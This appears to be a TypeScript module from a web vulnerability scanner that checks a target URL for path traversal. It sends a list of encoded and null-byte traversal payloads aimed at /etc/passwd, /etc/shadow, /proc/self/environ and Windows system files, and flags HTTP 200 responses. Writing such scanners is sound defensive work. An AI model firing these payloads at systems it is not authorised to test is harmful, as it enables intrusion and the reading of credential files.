import fetch from "../utils/fetch";
import { IndividualScanResult } from '../types/scans'

/**
 * Common file paths and traversal patterns to test for
 */
const FILE_TRAVERSAL_PATTERNS: string[] = [
    // Basic directory traversals
    '/../../../../etc/passwd',
    '/../../../etc/passwd',
    '/../../etc/passwd',

    // URL-encoded variations
    '/%2e%2e/%2e%2e/etc/passwd',
    '/%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '/..%2f..%2f..%2fetc%2fpasswd',
    '/..%252f..%252f..%252fetc%252fpasswd', // Double encoding

    // Windows-style traversals
    '/..\\..\\..\\windows\\win.ini',
    '/..%5c..%5c..%5cwindows%5cwin.ini',
    '/..%255c..%255c..%255cwindows%255cwin.ini',

    // Null byte injections
    '/../../../../etc/passwd%00',
    '/../../../../etc/passwd%00.jpg',
    '/../../../etc/passwd%00.txt',

    // Mixed encoding and slashes
    '/..\\/..\\/..\\/etc/passwd',
    '/..%5c..%2f..%5cetc%2fpasswd',

    // UTF-8/Unicode variations
    '/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
    '/%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd', // Full width characters

    // Interesting file targets (both Unix and Windows)
    '/../../../../etc/shadow',
    '/../../../../proc/self/environ',
    '/../../../../var/log/apache2/access.log',
    '/../../../../windows/win.ini',
    '/../../../../boot.ini',

    // With parameter suffixes
    '/../../../etc/passwd?test=123',
    '/../../../etc/passwd#fragment',

    // With fake extensions
    '/../../../etc/passwd.png',
    '/../../../etc/passwd.css',

    // Absolute paths (sometimes work)
    '/etc/passwd',
    '/C:/windows/win.ini'
];

/**
 * Scans for file traversal vulnerabilities by testing various path patterns
 * @param url The target URL to test against
 * @returns Object containing detection results and messages
 */
export default async function detectFileTraversal(url: URL): Promise<IndividualScanResult> {
    const testResults = await testTraversalPatterns(url);
    return compileTraversalResults(testResults);
}

/**
 * Tests all file traversal patterns against the target URL
 */
async function testTraversalPatterns(url: URL): Promise<PromiseSettledResult<boolean>[]> {
    return Promise.allSettled(
        FILE_TRAVERSAL_PATTERNS.map(async (path) => {
            const response = await fetch(`${url.origin}${path}`);
            return response.status === 200;
        })
    );
}

/**
 * Compiles test results into a final detection report
 */
function compileTraversalResults(
    results: PromiseSettledResult<boolean>[]
): IndividualScanResult {
    let vulnerabilityFound = false;
    const detectionMessages: string[] = [];

    results.forEach((result, index) => {
        if (result.status === 'fulfilled' && result.value) {
            vulnerabilityFound = true;
            detectionMessages.push(
                `Potential file traversal vulnerability detected at: ${FILE_TRAVERSAL_PATTERNS[index]}`
            );
        }
    });

    return {
        found: vulnerabilityFound,
        messages: detectionMessages.length > 0
            ? detectionMessages
            : ['No file traversal vulnerabilities detected']
    };
}